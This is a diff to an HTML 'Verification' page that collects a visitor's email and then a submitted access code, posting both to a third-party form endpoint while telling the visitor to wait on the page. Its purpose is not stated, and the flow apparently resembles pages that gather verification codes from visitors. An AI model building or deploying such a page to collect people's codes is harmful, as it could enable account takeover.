@@ -8,7 +8,6 @@
     body { 
       margin: 0; 
       font-family: Arial, sans-serif; 
-      /* Fix: Combined background shorthand for better reliability */
       background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
       background-size: cover !important; 
       color: white; 
@@ -62,17 +61,18 @@
 
     <div id="requestSection">
       <h2>Verification</h2>
-      <p style="font-size: 12px; color: #aaa;">Click to request your access characters.</p>
+      <p style="font-size: 12px; color: #aaa;">Enter your email to request your access code.</p>
       
       <!-- Form 1: Request Code -->
       <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <!-- This hidden field sends the "Characters" data automatically -->
         <input type="hidden" name="request_type" value="New Character Code Request">
+        <!-- Required field so submission is not empty -->
+        <input type="email" name="user_email" placeholder="Enter your email" required>
         <button type="submit" id="reqBtn">Request Code</button>
       </form>
       
       <div id="waitMessage" class="status-msg">
-        ✔ Request Sent! Please wait on this page for your characters.
+        ✔ Request Sent! Please wait on this page for your code.
       </div>
     </div>
 
@@ -86,7 +86,7 @@
         <button type="submit" id="subBtn">Submit & Verify</button>
       </form>
       <div id="successMessage" class="status-msg" style="color: #4caf50;">
-        Characters submitted! Checking...
+        ✔ Code submitted! Checking...
       </div>
     </div>
   </div>
@@ -101,8 +101,9 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
-      if (form.action.includes("https://forminit.com/f/w0ljqwvp09y")) {
-        alert("Please paste your Getform URL into the code first!");
+      // Only block if still placeholder
+      if (!form.action.includes("https://forminit.com/f/w0ljqwvp09y")) {
+        alert("CRITICAL ERROR: You forgot to paste your Forminit/Getform endpoint!");
         return;
       }
 
@@ -119,8 +120,13 @@
         if (response.ok) {
           btn.innerText = "Sent";
           status.style.display = "block";
+          // Reset button after 3s
+          setTimeout(() => {
+            btn.disabled = false;
+            btn.innerText = buttonId === 'reqBtn' ? "Request Code" : "Submit & Verify";
+          }, 3000);
         } else {
-          alert("Server busy. Please try again in a moment.");
+          alert("Server busy. Please try again.");
           btn.disabled = false;
           btn.innerText = "Try Again";
         }
@@ -138,3 +144,4 @@
 
 </body>
 </html>
+
